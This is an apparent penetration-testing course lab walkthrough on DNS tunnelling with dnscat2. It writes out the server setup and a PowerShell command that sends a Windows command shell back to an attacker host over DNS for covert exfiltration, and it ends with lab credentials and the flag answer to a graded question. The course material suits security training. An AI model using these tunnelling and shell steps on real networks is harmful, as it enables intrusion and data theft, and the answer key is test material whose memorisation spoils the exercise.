# DNS Tunneling with Dnscat2
[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic.

## Setting up & Using dnscat2
### Cloning dnscat2 and Setting Up the Server

```sh
masterofblafu@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
masterofblafu@htb[/htb]$ cd dnscat2/server/
masterofblafu@htb[/htb/dnscat2/server/]$ sudo gem install bundler
masterofblafu@htb[/htb/dnscat2/server/]$ sudo bundle install
```

### Starting the dnscat2 server

```sh
masterofblafu@htb[/htb/dnscat2/server/]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.

### Cloning dnscat2-powershell to the Attack Host

```sh
masterofblafu@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
### Import dnscat2.ps1
Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.

```pwsh
PS C:\htb> Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

```pwsh
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

### Confirming Session Establishment

```sh
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

### Listing dnscat2 Options
We can list the options we have with dnscat2 by entering `?` at the prompt.

```sh
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

### Interacting with the Established Session

```sh
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

## Questions
RDP to **10.129.42.198** (ACADEMY-PIVOTING-WIN10PIV), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer. **Answer: AC@tinth3Tunnel**
   - Cloning and setting up the dnscat2 server:
        ```sh
        masterofblafu@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
        masterofblafu@htb[/htb]$ cd dnscat2/server/
        masterofblafu@htb[/htb/dnscat2/server/]$ sudo gem install bundler
        masterofblafu@htb[/htb/dnscat2/server/]$ sudo bundle install
        masterofblafu@htb[/htb/dnscat2/server/]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

        New window created: 0
        dnscat2> New window created: crypto-debug
        Welcome to dnscat2! Some documentation may be out of date.

        auto_attach => false
        history_size (for new windows) => 1000
        Security policy changed: All connections must be encrypted
        New window created: dns1
        Starting Dnscat2 DNS server on 10.10.14.18:53
        [domains = inlanefreight.local]...

        Assuming you have an authoritative DNS server, you can run
        the client anywhere with the following (--secret is optional):

        ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

        To talk directly to the server without a domain name, run:

        ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

        Of course, you have to figure out <server> yourself! Clients
        will connect directly on UDP port 53.
        ```
   - Cloning and transfer dnscat2-powershell to the target host via shared drive in xfreerdp:
        ```sh
        masterofblafu@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
        masterofblafu@htb[/htb/dnscat2-powershell]$ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt! /drive:linux,/home/htb-ac-1863259/dnscat2-powershell
        ```
   - Run dnscat2-powershell on the target host to establish a tunnel with the server running on our attack host and send back a CMD shell session to our server:
        ```pwsh
        PS C:\Users\htb-student\Desktop> Start-Dnscat2 -DNSserver 10.10.15.159 -Domain inlanefreight.local -PreSharedSecret eb45cfef94f0967ecffd7850cc7683a9 -Exec cmd  
        ```
   - Interact with the session at our attack host and read the flag:
        ```sh
        dnscat2> New window created: 2
        Session 2 Security: ENCRYPTED AND VERIFIED!
        (the security depends on the strength of your pre-shared secret!)

        dnscat2> window -i 2
        New window created: 2
        history_size (session) => 1000
        Session 2 Security: ENCRYPTED AND VERIFIED!
        (the security depends on the strength of your pre-shared secret!)
        This is a console session!

        That means that anything you type will be sent as-is to the
        client, and anything they type will be displayed as-is on the
        screen! If the client is executing a command and you don't
        see a prompt, try typing 'pwd' or something!

        To go back, type ctrl-z.

        Microsoft Windows [Version 10.0.18363.1801]
        (c) 2019 Microsoft Corporation. All rights reserved.

        C:\Users\htb-student>
        exec (OFFICEMANAGER) 2> pwd
        exec (OFFICEMANAGER) 2> pwd
        'pwd' is not recognized as an internal or external command,
        operable program or batch file.

        C:\Users\htb-student>
        exec (OFFICEMANAGER) 2> more C:\Users\htb-student\Documents\flag.txt 
        AC@tinth3Tunnel
        ```